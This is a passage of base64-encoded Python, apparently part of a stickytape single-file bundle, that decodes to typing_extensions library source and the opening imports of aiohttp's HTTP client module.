ybiB0eXBpbmcuX0dlbmVyaWNBbGlhcyhzZWxmLCAoaXRlbSwpKVxuXG4gICAgQF9FeHRlbnNpb25zU3BlY2lhbEZvcm1cbiAgICBkZWYgTm90UmVxdWlyZWQoc2VsZiwgcGFyYW1ldGVycyk6XG4gICAgICAgICIiIkEgc3BlY2lhbCB0eXBpbmcgY29uc3RydWN0IHRvIG1hcmsgYSBrZXkgb2YgYSBUeXBlZERpY3QgYXNcbiAgICAgICAgcG90ZW50aWFsbHkgbWlzc2luZy4gRm9yIGV4YW1wbGU6XG5cbiAgICAgICAgICAgIGNsYXNzIE1vdmllKFR5cGVkRGljdCk6XG4gICAgICAgICAgICAgICAgdGl0bGU6IHN0clxuICAgICAgICAgICAgICAgIHllYXI6IE5vdFJlcXVpcmVkW2ludF1cblxuICAgICAgICAgICAgbSA9IE1vdmllKFxuICAgICAgICAgICAgICAgIHRpdGxlPVwnVGhlIE1hdHJpeFwnLCAgIyB0eXBlY2hlY2tlciBlcnJvciBpZiBrZXkgaXMgb21pdHRlZFxuICAgICAgICAgICAgICAgIHllYXI9MTk5OSxcbiAgICAgICAgICAgIClcbiAgICAgICAgIiIiXG4gICAgICAgIGl0ZW0gPSB0eXBpbmcuX3R5cGVfY2hlY2socGFyYW1ldGVycywgZlwne3NlbGYuX25hbWV9IGFjY2VwdHMgb25seSBhIHNpbmdsZSB0eXBlLlwnKVxuICAgICAgICByZXR1cm4gdHlwaW5nLl9HZW5lcmljQWxpYXMoc2VsZiwgKGl0ZW0sKSlcblxuZWxzZTpcbiAgICBjbGFzcyBfUmVxdWlyZWRGb3JtKHR5cGluZy5fU3BlY2lhbEZvcm0sIF9yb290PVRydWUpOlxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gXCd0eXBpbmdfZXh0ZW5zaW9ucy5cJyArIHNlbGYuX25hbWVcblxuICAgICAgICBkZWYgX19nZXRpdGVtX18oc2VsZiwgcGFyYW1ldGVycyk6XG4gICAgICAgICAgICBpdGVtID0gdHlwaW5nLl90eXBlX2NoZWNrKHBhcmFtZXRlcnMsXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZcJ3tzZWxmLl9uYW1lfSBhY2NlcHRzIG9ubHkgYSBzaW5nbGUgdHlwZS5cJylcbiAgICAgICAgICAgIHJldHVybiB0eXBpbmcuX0dlbmVyaWNBbGlhcyhzZWxmLCAoaXRlbSwpKVxuXG4gICAgUmVxdWlyZWQgPSBfUmVxdWlyZWRGb3JtKFxuICAgICAgICBcJ1JlcXVpcmVkXCcsXG4gICAgICAgIGRvYz0iIiJBIHNwZWNpYWwgdHlwaW5nIGNvbnN0cnVjdCB0byBtYXJrIGEga2V5IG9mIGEgdG90YWw9RmFsc2UgVHlwZWREaWN0XG4gICAgICAgIGFzIHJlcXVpcmVkLiBGb3IgZXhhbXBsZTpcblxuICAgICAgICAgICAgY2xhc3MgTW92aWUoVHlwZWREaWN0LCB0b3RhbD1GYWxzZSk6XG4gICAgICAgICAgICAgICAgdGl0bGU6IFJlcXVpcmVkW3N0cl1cbiAgICAgICAgICAgICAgICB5ZWFyOiBpbnRcblxuICAgICAgICAgICAgbSA9IE1vdmllKFxuICAgICAgICAgICAgICAgIHRpdGxlPVwnVGhlIE1hdHJpeFwnLCAgIyB0eXBlY2hlY2tlciBlcnJvciBpZiBrZXkgaXMgb21pdHRlZFxuICAgICAgICAgICAgICAgIHllYXI9MTk5OSxcbiAgICAgICAgICAgIClcblxuICAgICAgICBUaGVyZSBpcyBubyBydW50aW1lIGNoZWNraW5nIHRoYXQgYSByZXF1aXJlZCBrZXkgaXMgYWN0dWFsbHkgcHJvdmlkZWRcbiAgICAgICAgd2hlbiBpbnN0YW50aWF0aW5nIGEgcmVsYXRlZCBUeXBlZERpY3QuXG4gICAgICAgICIiIilcbiAgICBOb3RSZXF1aXJlZCA9IF9SZXF1aXJlZEZvcm0oXG4gICAgICAgIFwnTm90UmVxdWlyZWRcJyxcbiAgICAgICAgZG9jPSIiIkEgc3BlY2lhbCB0eXBpbmcgY29uc3RydWN0IHRvIG1hcmsgYSBrZXkgb2YgYSBUeXBlZERpY3QgYXNcbiAgICAgICAgcG90ZW50aWFsbHkgbWlzc2luZy4gRm9yIGV4YW1wbGU6XG5cbiAgICAgICAgICAgIGNsYXNzIE1vdmllKFR5cGVkRGljdCk6XG4gICAgICAgICAgICAgICAgdGl0bGU6IHN0clxuICAgICAgICAgICAgICAgIHllYXI6IE5vdFJlcXVpcmVkW2ludF1cblxuICAgICAgICAgICAgbSA9IE1vdmllKFxuICAgICAgICAgICAgICAgIHRpdGxlPVwnVGhlIE1hdHJpeFwnLCAgIyB0eXBlY2hlY2tlciBlcnJvciBpZiBrZXkgaXMgb21pdHRlZFxuICAgICAgICAgICAgICAgIHllYXI9MTk5OSxcbiAgICAgICAgICAgIClcbiAgICAgICAgIiIiKVxuXG5cbmlmIGhhc2F0dHIodHlwaW5nLCAiVW5wYWNrIik6ICAjIDMuMTErXG4gICAgVW5wYWNrID0gdHlwaW5nLlVucGFja1xuZWxpZiBzeXMudmVyc2lvbl9pbmZvWzoyXSA+PSAoMywgOSk6XG4gICAgY2xhc3MgX1VucGFja1NwZWNpYWxGb3JtKHR5cGluZy5fU3BlY2lhbEZvcm0sIF9yb290PVRydWUpOlxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gXCd0eXBpbmdfZXh0ZW5zaW9ucy5cJyArIHNlbGYuX25hbWVcblxuICAgIGNsYXNzIF9VbnBhY2tBbGlhcyh0eXBpbmcuX0dlbmVyaWNBbGlhcywgX3Jvb3Q9VHJ1ZSk6XG4gICAgICAgIF9fY2xhc3NfXyA9IHR5cGluZy5UeXBlVmFyXG5cbiAgICBAX1VucGFja1NwZWNpYWxGb3JtXG4gICAgZGVmIFVucGFjayhzZWxmLCBwYXJhbWV0ZXJzKTpcbiAgICAgICAgIiIiQSBzcGVjaWFsIHR5cGluZyBjb25zdHJ1Y3QgdG8gdW5wYWNrIGEgdmFyaWFkaWMgdHlwZS4gRm9yIGV4YW1wbGU6XG5cbiAgICAgICAgICAgIFNoYXBlID0gVHlwZVZhclR1cGxlKFwnU2hhcGVcJylcbiAgICAgICAgICAgIEJhdGNoID0gTmV3VHlwZShcJ0JhdGNoXCcsIGludClcblxuICAgICAgICAgICAgZGVmIGFkZF9iYXRjaF9heGlzKFxuICAgICAgICAgICAgICAgIHg6IEFycmF5W1VucGFja1tTaGFwZV1dXG4gICAgICAgICAgICApIC0+IEFycmF5W0JhdGNoLCBVbnBhY2tbU2hhcGVdXTogLi4uXG5cbiAgICAgICAgIiIiXG4gICAgICAgIGl0ZW0gPSB0eXBpbmcuX3R5cGVfY2hlY2socGFyYW1ldGVycywgZlwne3NlbGYuX25hbWV9IGFjY2VwdHMgb25seSBhIHNpbmdsZSB0eXBlLlwnKVxuICAgICAgICByZXR1cm4gX1VucGFja0FsaWFzKHNlbGYsIChpdGVtLCkpXG5cbiAgICBkZWYgX2lzX3VucGFjayhvYmopOlxuICAgICAgICByZXR1cm4gaXNpbnN0YW5jZShvYmosIF9VbnBhY2tBbGlhcylcblxuZWxzZTpcbiAgICBjbGFzcyBfVW5wYWNrQWxpYXModHlwaW5nLl9HZW5lcmljQWxpYXMsIF9yb290PVRydWUpOlxuICAgICAgICBfX2NsYXNzX18gPSB0eXBpbmcuVHlwZVZhclxuXG4gICAgY2xhc3MgX1VucGFja0Zvcm0odHlwaW5nLl9TcGVjaWFsRm9ybSwgX3Jvb3Q9VHJ1ZSk6XG4gICAgICAgIGRlZiBfX3JlcHJfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBcJ3R5cGluZ19leHRlbnNpb25zLlwnICsgc2VsZi5fbmFtZVxuXG4gICAgICAgIGRlZiBfX2dldGl0ZW1fXyhzZWxmLCBwYXJhbWV0ZXJzKTpcbiAgICAgICAgICAgIGl0ZW0gPSB0eXBpbmcuX3R5cGVfY2hlY2socGFyYW1ldGVycyxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZlwne3NlbGYuX25hbWV9IGFjY2VwdHMgb25seSBhIHNpbmdsZSB0eXBlLlwnKVxuICAgICAgICAgICAgcmV0dXJuIF9VbnBhY2tBbGlhcyhzZWxmLCAoaXRlbSwpKVxuXG4gICAgVW5wYWNrID0gX1VucGFja0Zvcm0oXG4gICAgICAgIFwnVW5wYWNrXCcsXG4gICAgICAgIGRvYz0iIiJBIHNwZWNpYWwgdHlwaW5nIGNvbnN0cnVjdCB0byB1bnBhY2sgYSB2YXJpYWRpYyB0eXBlLiBGb3IgZXhhbXBsZTpcblxuICAgICAgICAgICAgU2hhcGUgPSBUeXBlVmFyVHVwbGUoXCdTaGFwZVwnKVxuICAgICAgICAgICAgQmF0Y2ggPSBOZXdUeXBlKFwnQmF0Y2hcJywgaW50KVxuXG4gICAgICAgICAgICBkZWYgYWRkX2JhdGNoX2F4aXMoXG4gICAgICAgICAgICAgICAgeDogQXJyYXlbVW5wYWNrW1NoYXBlXV1cbiAgICAgICAgICAgICkgLT4gQXJyYXlbQmF0Y2gsIFVucGFja1tTaGFwZV1dOiAuLi5cblxuICAgICAgICAiIiIpXG5cbiAgICBkZWYgX2lzX3VucGFjayhvYmopOlxuICAgICAgICByZXR1cm4gaXNpbnN0YW5jZShvYmosIF9VbnBhY2tBbGlhcylcblxuXG5pZiBoYXNhdHRyKHR5cGluZywgIlR5cGVWYXJUdXBsZSIpOiAgIyAzLjExK1xuICAgIFR5cGVWYXJUdXBsZSA9IHR5cGluZy5UeXBlVmFyVHVwbGVcbmVsc2U6XG4gICAgY2xhc3MgVHlwZVZhclR1cGxlOlxuICAgICAgICAiIiJUeXBlIHZhcmlhYmxlIHR1cGxlLlxuXG4gICAgICAgIFVzYWdlOjpcblxuICAgICAgICAgICAgVHMgPSBUeXBlVmFyVHVwbGUoXCdUc1wnKVxuXG4gICAgICAgIEluIHRoZSBzYW1lIHdheSB0aGF0IGEgbm9ybWFsIHR5cGUgdmFyaWFibGUgaXMgYSBzdGFuZC1pbiBmb3IgYSBzaW5nbGVcbiAgICAgICAgdHlwZSBzdWNoIGFzIGBgaW50YGAsIGEgdHlwZSB2YXJpYWJsZSAqdHVwbGUqIGlzIGEgc3RhbmQtaW4gZm9yIGEgKnR1cGxlKlxuICAgICAgICB0eXBlIHN1Y2ggYXMgYGBUdXBsZVtpbnQsIHN0cl1gYC5cblxuICAgICAgICBUeXBlIHZhcmlhYmxlIHR1cGxlcyBjYW4gYmUgdXNlZCBpbiBgYEdlbmVyaWNgYCBkZWNsYXJhdGlvbnMuXG4gICAgICAgIENvbnNpZGVyIHRoZSBmb2xsb3dpbmcgZXhhbXBsZTo6XG5cbiAgICAgICAgICAgIGNsYXNzIEFycmF5KEdlbmVyaWNbKlRzXSk6IC4uLlxuXG4gICAgICAgIFRoZSBgYFRzYGAgdHlwZSB2YXJpYWJsZSB0dXBsZSBoZXJlIGJlaGF2ZXMgbGlrZSBgYHR1cGxlW1QxLCBUMl1gYCxcbiAgICAgICAgd2hlcmUgYGBUMWBgIGFuZCBgYFQyYGAgYXJlIHR5cGUgdmFyaWFibGVzLiBUbyB1c2UgdGhlc2UgdHlwZSB2YXJpYWJsZXNcbiAgICAgICAgYXMgdHlwZSBwYXJhbWV0ZXJzIG9mIGBgQXJyYXlgYCwgd2UgbXVzdCAqdW5wYWNrKiB0aGUgdHlwZSB2YXJpYWJsZSB0dXBsZSB1c2luZ1xuICAgICAgICB0aGUgc3RhciBvcGVyYXRvcjogYGAqVHNgYC4gVGhlIHNpZ25hdHVyZSBvZiBgYEFycmF5YGAgdGhlbiBiZWhhdmVzXG4gICAgICAgIGFzIGlmIHdlIGhhZCBzaW1wbHkgd3JpdHRlbiBgYGNsYXNzIEFycmF5KEdlbmVyaWNbVDEsIFQyXSk6IC4uLmBgLlxuICAgICAgICBJbiBjb250cmFzdCB0byBgYEdlbmVyaWNbVDEsIFQyXWBgLCBob3dldmVyLCBgYEdlbmVyaWNbKlNoYXBlXWBgIGFsbG93c1xuICAgICAgICB1cyB0byBwYXJhbWV0ZXJpc2UgdGhlIGNsYXNzIHdpdGggYW4gKmFyYml0cmFyeSogbnVtYmVyIG9mIHR5cGUgcGFyYW1ldGVycy5cblxuICAgICAgICBUeXBlIHZhcmlhYmxlIHR1cGxlcyBjYW4gYmUgdXNlZCBhbnl3aGVyZSBhIG5vcm1hbCBgYFR5cGVWYXJgYCBjYW4uXG4gICAgICAgIFRoaXMgaW5jbHVkZXMgY2xhc3MgZGVmaW5pdGlvbnMsIGFzIHNob3duIGFib3ZlLCBhcyB3ZWxsIGFzIGZ1bmN0aW9uXG4gICAgICAgIHNpZ25hdHVyZXMgYW5kIHZhcmlhYmxlIGFubm90YXRpb25zOjpcblxuICAgICAgICAgICAgY2xhc3MgQXJyYXkoR2VuZXJpY1sqVHNdKTpcblxuICAgICAgICAgICAgICAgIGRlZiBfX2luaXRfXyhzZWxmLCBzaGFwZTogVHVwbGVbKlRzXSk6XG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3NoYXBlOiBUdXBsZVsqVHNdID0gc2hhcGVcblxuICAgICAgICAgICAgICAgIGRlZiBnZXRfc2hhcGUoc2VsZikgLT4gVHVwbGVbKlRzXTpcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHNlbGYuX3NoYXBlXG5cbiAgICAgICAgICAgIHNoYXBlID0gKEhlaWdodCg0ODApLCBXaWR0aCg2NDApKVxuICAgICAgICAgICAgeDogQXJyYXlbSGVpZ2h0LCBXaWR0aF0gPSBBcnJheShzaGFwZSlcbiAgICAgICAgICAgIHkgPSBhYnMoeCkgICMgSW5mZXJyZWQgdHlwZSBpcyBBcnJheVtIZWlnaHQsIFdpZHRoXVxuICAgICAgICAgICAgeiA9IHggKyB4ICAgIyAgICAgICAgLi4uICAgIGlzIEFycmF5W0hlaWdodCwgV2lkdGhdXG4gICAgICAgICAgICB4LmdldF9zaGFwZSgpICAjICAgICAuLi4gICAgaXMgdHVwbGVbSGVpZ2h0LCBXaWR0aF1cblxuICAgICAgICAiIiJcblxuICAgICAgICAjIFRyaWNrIEdlbmVyaWMgX19wYXJhbWV0ZXJzX18uXG4gICAgICAgIF9fY2xhc3NfXyA9IHR5cGluZy5UeXBlVmFyXG5cbiAgICAgICAgZGVmIF9faXRlcl9fKHNlbGYpOlxuICAgICAgICAgICAgeWllbGQgc2VsZi5fX3VucGFja2VkX19cblxuICAgICAgICBkZWYgX19pbml0X18oc2VsZiwgbmFtZSk6XG4gICAgICAgICAgICBzZWxmLl9fbmFtZV9fID0gbmFtZVxuXG4gICAgICAgICAgICAjIGZvciBwaWNrbGluZzpcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICBkZWZfbW9kID0gc3lzLl9nZXRmcmFtZSgxKS5mX2dsb2JhbHMuZ2V0KFwnX19uYW1lX19cJywgXCdfX21haW5fX1wnKVxuICAgICAgICAgICAgZXhjZXB0IChBdHRyaWJ1dGVFcnJvciwgVmFsdWVFcnJvcik6XG4gICAgICAgICAgICAgICAgZGVmX21vZCA9IE5vbmVcbiAgICAgICAgICAgIGlmIGRlZl9tb2QgIT0gXCd0eXBpbmdfZXh0ZW5zaW9uc1wnOlxuICAgICAgICAgICAgICAgIHNlbGYuX19tb2R1bGVfXyA9IGRlZl9tb2RcblxuICAgICAgICAgICAgc2VsZi5fX3VucGFja2VkX18gPSBVbnBhY2tbc2VsZl1cblxuICAgICAgICBkZWYgX19yZXByX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fX25hbWVfX1xuXG4gICAgICAgIGRlZiBfX2hhc2hfXyhzZWxmKTpcbiAgICAgICAgICAgIHJldHVybiBvYmplY3QuX19oYXNoX18oc2VsZilcblxuICAgICAgICBkZWYgX19lcV9fKHNlbGYsIG90aGVyKTpcbiAgICAgICAgICAgIHJldHVybiBzZWxmIGlzIG90aGVyXG5cbiAgICAgICAgZGVmIF9fcmVkdWNlX18oc2VsZik6XG4gICAgICAgICAgICByZXR1cm4gc2VsZi5fX25hbWVfX1xuXG4gICAgICAgIGRlZiBfX2luaXRfc3ViY2xhc3NfXyhzZWxmLCAqYXJncywgKiprd2RzKTpcbiAgICAgICAgICAgIGlmIFwnX3Jvb3RcJyBub3QgaW4ga3dkczpcbiAgICAgICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkNhbm5vdCBzdWJjbGFzcyBzcGVjaWFsIHR5cGluZyBjbGFzc2VzIilcblxuXG5pZiBoYXNhdHRyKHR5cGluZywgInJldmVhbF90eXBlIik6XG4gICAgcmV2ZWFsX3R5cGUgPSB0eXBpbmcucmV2ZWFsX3R5cGVcbmVsc2U6XG4gICAgZGVmIHJldmVhbF90eXBlKF9fb2JqOiBUKSAtPiBUOlxuICAgICAgICAiIiJSZXZlYWwgdGhlIGluZmVycmVkIHR5cGUgb2YgYSB2YXJpYWJsZS5cblxuICAgICAgICBXaGVuIGEgc3RhdGljIHR5cGUgY2hlY2tlciBlbmNvdW50ZXJzIGEgY2FsbCB0byBgYHJldmVhbF90eXBlKClgYCxcbiAgICAgICAgaXQgd2lsbCBlbWl0IHRoZSBpbmZlcnJlZCB0eXBlIG9mIHRoZSBhcmd1bWVudDo6XG5cbiAgICAgICAgICAgIHg6IGludCA9IDFcbiAgICAgICAgICAgIHJldmVhbF90eXBlKHgpXG5cbiAgICAgICAgUnVubmluZyBhIHN0YXRpYyB0eXBlIGNoZWNrZXIgKGUuZy4sIGBgbXlweWBgKSBvbiB0aGlzIGV4YW1wbGVcbiAgICAgICAgd2lsbCBwcm9kdWNlIG91dHB1dCBzaW1pbGFyIHRvIFwnUmV2ZWFsZWQgdHlwZSBpcyAiYnVpbHRpbnMuaW50IlwnLlxuXG4gICAgICAgIEF0IHJ1bnRpbWUsIHRoZSBmdW5jdGlvbiBwcmludHMgdGhlIHJ1bnRpbWUgdHlwZSBvZiB0aGVcbiAgICAgICAgYXJndW1lbnQgYW5kIHJldHVybnMgaXQgdW5jaGFuZ2VkLlxuXG4gICAgICAgICIiIlxuICAgICAgICBwcmludChmIlJ1bnRpbWUgdHlwZSBpcyB7dHlwZShfX29iaikuX19uYW1lX18hcn0iLCBmaWxlPXN5cy5zdGRlcnIpXG4gICAgICAgIHJldHVybiBfX29ialxuXG5cbmlmIGhhc2F0dHIodHlwaW5nLCAiYXNzZXJ0X25ldmVyIik6XG4gICAgYXNzZXJ0X25ldmVyID0gdHlwaW5nLmFzc2VydF9uZXZlclxuZWxzZTpcbiAgICBkZWYgYXNzZXJ0X25ldmVyKF9fYXJnOiBOZXZlcikgLT4gTmV2ZXI6XG4gICAgICAgICIiIkFzc2VydCB0byB0aGUgdHlwZSBjaGVja2VyIHRoYXQgYSBsaW5lIG9mIGNvZGUgaXMgdW5yZWFjaGFibGUuXG5cbiAgICAgICAgRXhhbXBsZTo6XG5cbiAgICAgICAgICAgIGRlZiBpbnRfb3Jfc3RyKGFyZzogaW50IHwgc3RyKSAtPiBOb25lOlxuICAgICAgICAgICAgICAgIG1hdGNoIGFyZzpcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBpbnQoKTpcbiAgICAgICAgICAgICAgICAgICAgICAgIHByaW50KCJJdFwncyBhbiBpbnQiKVxuICAgICAgICAgICAgICAgICAgICBjYXNlIHN0cigpOlxuICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnQoIkl0XCdzIGEgc3RyIilcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBfOlxuICAgICAgICAgICAgICAgICAgICAgICAgYXNzZXJ0X25ldmVyKGFyZylcblxuICAgICAgICBJZiBhIHR5cGUgY2hlY2tlciBmaW5kcyB0aGF0IGEgY2FsbCB0byBhc3NlcnRfbmV2ZXIoKSBpc1xuICAgICAgICByZWFjaGFibGUsIGl0IHdpbGwgZW1pdCBhbiBlcnJvci5cblxuICAgICAgICBBdCBydW50aW1lLCB0aGlzIHRocm93cyBhbiBleGNlcHRpb24gd2hlbiBjYWxsZWQuXG5cbiAgICAgICAgIiIiXG4gICAgICAgIHJhaXNlIEFzc2VydGlvbkVycm9yKCJFeHBlY3RlZCBjb2RlIHRvIGJlIHVucmVhY2hhYmxlIilcblxuXG5pZiBoYXNhdHRyKHR5cGluZywgXCdkYXRhY2xhc3NfdHJhbnNmb3JtXCcpOlxuICAgIGRhdGFjbGFzc190cmFuc2Zvcm0gPSB0eXBpbmcuZGF0YWNsYXNzX3RyYW5zZm9ybVxuZWxzZTpcbiAgICBkZWYgZGF0YWNsYXNzX3RyYW5zZm9ybShcbiAgICAgICAgKixcbiAgICAgICAgZXFfZGVmYXVsdDogYm9vbCA9IFRydWUsXG4gICAgICAgIG9yZGVyX2RlZmF1bHQ6IGJvb2wgPSBGYWxzZSxcbiAgICAgICAga3dfb25seV9kZWZhdWx0OiBib29sID0gRmFsc2UsXG4gICAgICAgIGZpZWxkX3NwZWNpZmllcnM6IHR5cGluZy5UdXBsZVtcbiAgICAgICAgICAgIHR5cGluZy5Vbmlvblt0eXBpbmcuVHlwZVt0eXBpbmcuQW55XSwgdHlwaW5nLkNhbGxhYmxlWy4uLiwgdHlwaW5nLkFueV1dLFxuICAgICAgICAgICAgLi4uXG4gICAgICAgIF0gPSAoKSxcbiAgICAgICAgKiprd2FyZ3M6IHR5cGluZy5BbnksXG4gICAgKSAtPiB0eXBpbmcuQ2FsbGFibGVbW1RdLCBUXTpcbiAgICAgICAgIiIiRGVjb3JhdG9yIHRoYXQgbWFya3MgYSBmdW5jdGlvbiwgY2xhc3MsIG9yIG1ldGFjbGFzcyBhcyBwcm92aWRpbmdcbiAgICAgICAgZGF0YWNsYXNzLWxpa2UgYmVoYXZpb3IuXG5cbiAgICAgICAgRXhhbXBsZTpcblxuICAgICAgICAgICAgZnJvbSB0eXBpbmdfZXh0ZW5zaW9ucyBpbXBvcnQgZGF0YWNsYXNzX3RyYW5zZm9ybVxuXG4gICAgICAgICAgICBfVCA9IFR5cGVWYXIoIl9UIilcblxuICAgICAgICAgICAgIyBVc2VkIG9uIGEgZGVjb3JhdG9yIGZ1bmN0aW9uXG4gICAgICAgICAgICBAZGF0YWNsYXNzX3RyYW5zZm9ybSgpXG4gICAgICAgICAgICBkZWYgY3JlYXRlX21vZGVsKGNsczogdHlwZVtfVF0pIC0+IHR5cGVbX1RdOlxuICAgICAgICAgICAgICAgIC4uLlxuICAgICAgICAgICAgICAgIHJldHVybiBjbHNcblxuICAgICAgICAgICAgQGNyZWF0ZV9tb2RlbFxuICAgICAgICAgICAgY2xhc3MgQ3VzdG9tZXJNb2RlbDpcbiAgICAgICAgICAgICAgICBpZDogaW50XG4gICAgICAgICAgICAgICAgbmFtZTogc3RyXG5cbiAgICAgICAgICAgICMgVXNlZCBvbiBhIGJhc2UgY2xhc3NcbiAgICAgICAgICAgIEBkYXRhY2xhc3NfdHJhbnNmb3JtKClcbiAgICAgICAgICAgIGNsYXNzIE1vZGVsQmFzZTogLi4uXG5cbiAgICAgICAgICAgIGNsYXNzIEN1c3RvbWVyTW9kZWwoTW9kZWxCYXNlKTpcbiAgICAgICAgICAgICAgICBpZDogaW50XG4gICAgICAgICAgICAgICAgbmFtZTogc3RyXG5cbiAgICAgICAgICAgICMgVXNlZCBvbiBhIG1ldGFjbGFzc1xuICAgICAgICAgICAgQGRhdGFjbGFzc190cmFuc2Zvcm0oKVxuICAgICAgICAgICAgY2xhc3MgTW9kZWxNZXRhKHR5cGUpOiAuLi5cblxuICAgICAgICAgICAgY2xhc3MgTW9kZWxCYXNlKG1ldGFjbGFzcz1Nb2RlbE1ldGEpOiAuLi5cblxuICAgICAgICAgICAgY2xhc3MgQ3VzdG9tZXJNb2RlbChNb2RlbEJhc2UpOlxuICAgICAgICAgICAgICAgIGlkOiBpbnRcbiAgICAgICAgICAgICAgICBuYW1lOiBzdHJcblxuICAgICAgICBFYWNoIG9mIHRoZSBgYEN1c3RvbWVyTW9kZWxgYCBjbGFzc2VzIGRlZmluZWQgaW4gdGhpcyBleGFtcGxlIHdpbGwgbm93XG4gICAgICAgIGJlaGF2ZSBzaW1pbGFybHkgdG8gYSBkYXRhY2xhc3MgY3JlYXRlZCB3aXRoIHRoZSBgYEBkYXRhY2xhc3Nlcy5kYXRhY2xhc3NgYFxuICAgICAgICBkZWNvcmF0b3IuIEZvciBleGFtcGxlLCB0aGUgdHlwZSBjaGVja2VyIHdpbGwgc3ludGhlc2l6ZSBhbiBgYF9faW5pdF9fYGBcbiAgICAgICAgbWV0aG9kLlxuXG4gICAgICAgIFRoZSBhcmd1bWVudHMgdG8gdGhpcyBkZWNvcmF0b3IgY2FuIGJlIHVzZWQgdG8gY3VzdG9taXplIHRoaXMgYmVoYXZpb3I6XG4gICAgICAgIC0gYGBlcV9kZWZhdWx0YGAgaW5kaWNhdGVzIHdoZXRoZXIgdGhlIGBgZXFgYCBwYXJhbWV0ZXIgaXMgYXNzdW1lZCB0byBiZVxuICAgICAgICAgIFRydWUgb3IgRmFsc2UgaWYgaXQgaXMgb21pdHRlZCBieSB0aGUgY2FsbGVyLlxuICAgICAgICAtIGBgb3JkZXJfZGVmYXVsdGBgIGluZGljYXRlcyB3aGV0aGVyIHRoZSBgYG9yZGVyYGAgcGFyYW1ldGVyIGlzXG4gICAgICAgICAgYXNzdW1lZCB0byBiZSBUcnVlIG9yIEZhbHNlIGlmIGl0IGlzIG9taXR0ZWQgYnkgdGhlIGNhbGxlci5cbiAgICAgICAgLSBgYGt3X29ubHlfZGVmYXVsdGBgIGluZGljYXRlcyB3aGV0aGVyIHRoZSBgYGt3X29ubHlgYCBwYXJhbWV0ZXIgaXNcbiAgICAgICAgICBhc3N1bWVkIHRvIGJlIFRydWUgb3IgRmFsc2UgaWYgaXQgaXMgb21pdHRlZCBieSB0aGUgY2FsbGVyLlxuICAgICAgICAtIGBgZmllbGRfc3BlY2lmaWVyc2BgIHNwZWNpZmllcyBhIHN0YXRpYyBsaXN0IG9mIHN1cHBvcnRlZCBjbGFzc2VzXG4gICAgICAgICAgb3IgZnVuY3Rpb25zIHRoYXQgZGVzY3JpYmUgZmllbGRzLCBzaW1pbGFyIHRvIGBgZGF0YWNsYXNzZXMuZmllbGQoKWBgLlxuXG4gICAgICAgIEF0IHJ1bnRpbWUsIHRoaXMgZGVjb3JhdG9yIHJlY29yZHMgaXRzIGFyZ3VtZW50cyBpbiB0aGVcbiAgICAgICAgYGBfX2RhdGFjbGFzc190cmFuc2Zvcm1fX2BgIGF0dHJpYnV0ZSBvbiB0aGUgZGVjb3JhdGVkIG9iamVjdC5cblxuICAgICAgICBTZWUgUEVQIDY4MSBmb3IgZGV0YWlscy5cblxuICAgICAgICAiIiJcbiAgICAgICAgZGVmIGRlY29yYXRvcihjbHNfb3JfZm4pOlxuICAgICAgICAgICAgY2xzX29yX2ZuLl9fZGF0YWNsYXNzX3RyYW5zZm9ybV9fID0ge1xuICAgICAgICAgICAgICAgICJlcV9kZWZhdWx0IjogZXFfZGVmYXVsdCxcbiAgICAgICAgICAgICAgICAib3JkZXJfZGVmYXVsdCI6IG9yZGVyX2RlZmF1bHQsXG4gICAgICAgICAgICAgICAgImt3X29ubHlfZGVmYXVsdCI6IGt3X29ubHlfZGVmYXVsdCxcbiAgICAgICAgICAgICAgICAiZmllbGRfc3BlY2lmaWVycyI6IGZpZWxkX3NwZWNpZmllcnMsXG4gICAgICAgICAgICAgICAgImt3YXJncyI6IGt3YXJncyxcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJldHVybiBjbHNfb3JfZm5cbiAgICAgICAgcmV0dXJuIGRlY29yYXRvclxuXG5cbiMgV2UgaGF2ZSB0byBkbyBzb21lIG1vbmtleSBwYXRjaGluZyB0byBkZWFsIHdpdGggdGhlIGR1YWwgbmF0dXJlIG9mXG4jIFVucGFjay9UeXBlVmFyVHVwbGU6XG4jIC0gV2Ugd2FudCBVbnBhY2sgdG8gYmUgYSBraW5kIG9mIFR5cGVWYXIgc28gaXQgZ2V0cyBhY2NlcHRlZCBpblxuIyAgIEdlbmVyaWNbVW5wYWNrW1RzXV1cbiMgLSBXZSB3YW50IGl0IHRvICpub3QqIGJlIHRyZWF0ZWQgYXMgYSBUeXBlVmFyIGZvciB0aGUgcHVycG9zZXMgb2ZcbiMgICBjb3VudGluZyBnZW5lcmljIHBhcmFtZXRlcnMsIHNvIHRoYXQgd2hlbiB3ZSBzdWJzY3JpcHQgYSBnZW5lcmljLFxuIyAgIHRoZSBydW50aW1lIGRvZXNuXCd0IHRyeSB0byBzdWJzdGl0dXRlIHRoZSBVbnBhY2sgd2l0aCB0aGUgc3Vic2NyaXB0ZWQgdHlwZS5cbmlmIG5vdCBoYXNhdHRyKHR5cGluZywgIlR5cGVWYXJUdXBsZSIpOlxuICAgIHR5cGluZy5fY29sbGVjdF90eXBlX3ZhcnMgPSBfY29sbGVjdF90eXBlX3ZhcnNcbiAgICB0eXBpbmcuX2NoZWNrX2dlbmVyaWMgPSBfY2hlY2tfZ2VuZXJpY1xuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvY2xpZW50LnB5JywgYiciIiJIVFRQIENsaWVudCBmb3IgYXN5bmNpby4iIiJcclxuXHJcbmltcG9ydCBhc3luY2lvXHJcbmltcG9ydCBiYXNlNjRcclxuaW1wb3J0IGhhc2hsaWJcclxuaW1wb3J0IGpzb25cclxuaW1wb3J0IG9zXHJcbmltcG9ydCBzeXNcclxuaW1wb3J0IHRyYWNlYmFja1xyXG5pbXBvcnQgd2FybmluZ3N